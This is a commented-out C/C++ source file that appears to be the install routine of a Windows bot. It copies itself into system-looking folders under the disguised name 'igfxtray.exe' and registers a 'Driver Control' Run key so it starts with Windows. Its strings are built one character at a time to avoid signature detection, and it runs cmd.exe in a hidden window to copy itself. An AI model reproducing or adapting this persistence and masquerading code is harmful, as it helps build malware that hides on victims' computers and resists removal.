//#include <Windows.h>
//#include <Shlwapi.h> // SHregistry
//#pragma comment(lib, "Shlwapi.lib")
//
//#include "Install.h"
//#include "Utils.h"
//#include "Sysinfo.h"
//
//static	WCHAR winNT[] = {'\\','W','i','n','d','o','w','s',' ','N','T','\\', 0};
//static	WCHAR ms[] = {'\\','M','i','c','r','o','s','o','f','t','\\', 0};
//static	WCHAR regname[] = {'D','r','i','v','e','r',' ','C','o','n','t','r','o','l', 0};
//static  WCHAR botname[] = {'i','g','f','x','t','r','a','y','.','e','x','e', 0};
//static  WCHAR Valuename[]={'D','i','s','p','l','a','y',' ','A','d','a','p','t','e','r',' ','c','o','m','p','o','n','e','n','t', 0};
//static  WCHAR csKey[]={'S','O','F','T','W','A','R','E','\\','\\','M','i','c','r','o','s','o','f','t','\\','\\','W','i','n','d','o','w','s','\\','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','\\','R','u','n', 0};
//
//bool installation(WCHAR execloc[ MAX_PATH ])
//{
//	HUSKEY hKey;
//	LSTATUS lStat=NULL;
//	WCHAR wcmdcopy[260]; //cmd params
//	WCHAR wcmdreg[260]; //cmd params
//	WCHAR wcmdloc[260]; //cmd location
//	WCHAR botloc[260]; //bot location (destination)
//	bool admin = false;
//
//	//check if we have admin priviliges
//	if( HasAdminPrivileges() )
//	{
//		admin = true;
//	}
//	if(admin)
//	{
//		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(3), winNT, botname ); // program files
//	} else
//	{
//		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(2), ms, botname ); //all appdata
//	}	
//	/*	StrCmpW
//		; if execution location equals to bot location.
//	*/
//	if(!StrCmpW(execloc, botloc))
//	{
//		return false;
//	}
//	//open registry
//	lStat = SHRegOpenUSKeyW ( csKey, KEY_ALL_ACCESS ,NULL ,&hKey , 0 );
//	//check if we successfully opened registry
//	if(lStat == ERROR_SUCCESS)
//	{
//		if(admin)
//		{
//			SHRegWriteUSValueW( hKey, regname, REG_SZ, botloc, lstrlenW ( botloc ) * 2, SHREGSET_HKLM );
//		} else
//		{
//			SHRegWriteUSValueW( hKey,regname, REG_SZ,botloc, lstrlenW ( botloc ) * 2,SHREGSET_HKCU);
//		}
//	} else //fail-safe
//	{
//		//RegOpenKeyExW
//	}
//
//	WCHAR comspec[] = {'C','o','m','S','p','e','c', 0};
//	size_t	nSize = _countof(wcmdloc);
//	_wgetenv_s( &nSize, wcmdloc, comspec); //grab ComSpec loc > cmd.exe
//
//	if( lstrlenW(wcmdloc) == NULL ) //if string length of comspec is 0 we use CopyFileW
//	{
//		CopyFileW(execloc, botloc, FALSE);
//	}
//		
//	STARTUPINFOW si; 
//	PROCESS_INFORMATION pi; 
//	memset(&si, 0, sizeof(si)); 
//	memset(&pi, 0, sizeof(pi)); 
//	si.cb = sizeof(si);
//		
//	WCHAR wcmdParam[] = {'/','c',' ','c','o','p','y', 0};
//	wsprintfW(wcmdcopy, L"%s \"%s\" \"%s\" /V",wcmdParam, execloc, botloc);
//	if ( !CreateProcessW(wcmdloc, wcmdcopy, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi) )
//	{
//		CopyFileW(execloc, botloc, FALSE);
//	}
//	return true;
//}
//
//
//void installbot(WCHAR execloc[260])
//{
//	HUSKEY hKey;
//	LSTATUS lStat=NULL;
//	WCHAR wcmdcopy[260]; //cmd params
//	WCHAR wcmdreg[260]; //cmd params
//	WCHAR wcmdloc[260]; //cmd location
//	WCHAR botloc[260]; //bot location (destination)
//
//	memset ( botloc , 0 , sizeof ( botloc ) );
//	memset ( wcmdloc , 0 , sizeof ( wcmdloc ) );
//	memset ( wcmdreg , 0 , sizeof ( wcmdreg ) );
//	memset ( wcmdcopy , 0 , sizeof ( wcmdcopy ) );
//	
//	WCHAR winNT[] = {'\\','\\','W','i','n','d','o','w','s',' ','N','T','\\','\\', 0};
//	WCHAR ms[] = {'\\','\\','M','i','c','r','o','s','o','f','t','\\','\\', 0};
//	if( HasAdminPrivileges() )
//	{
//		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(2), ms, botname ); //all %appdata%
//		if(PathFileExistsW(botloc)) ///if other path file exists
//		{
//			DeleteFileW(botloc); //del it.
//		}
//		memset( botloc, 0, sizeof( botloc ) );
//		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(3),winNT, botname ); //progfiles
//	}
//	else
//	{
//		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(3),winNT, botname );//progfiles
//		if(PathFileExistsW(botloc)) ///if we already exists in admin path
//		{
//			return;
//		}
//	}
//		memset( botloc, 0, sizeof( botloc ) );
//		wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(2), ms, botname ); //all %appdata%
//		if(PathFileExistsW(botloc))
//		{
//			return;
//		}
//		if(StrCmpW(execloc, botloc))
//		{
//			return;
//		}
//		WCHAR comspec[] = {'C','o','m','S','p','e','c', 0};
//		size_t	nSize = _countof(wcmdloc);
//		_wgetenv_s( &nSize, wcmdloc, comspec); //grab ComSpec loc > cmd.exe
//
//		if( lstrlenW(wcmdloc) == NULL ) //if string length of comspec is 0 we use CopyFileW
//		{
//			CopyFileW(execloc, botloc, FALSE);
//		}
//		
//		STARTUPINFOW si; 
//		PROCESS_INFORMATION pi; 
//	    memset(&si, 0, sizeof(si)); 
//	    memset(&pi, 0, sizeof(pi)); 
//	    si.cb = sizeof(si);
//		
//		WCHAR wcmdParam[] = {'/','c',' ','c','o','p','y', 0};
//		wsprintfW(wcmdcopy, L"%s \"%s\" \"%s\" /V",wcmdParam, execloc, botloc);
//		if ( !CreateProcessW(wcmdloc, wcmdcopy, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi) )
//		{
//			CopyFileW(execloc, botloc, FALSE);
//		}
//}
//
//void SHCreateKey(WCHAR *regname, WCHAR *botloc, bool admin)
//{
//
//}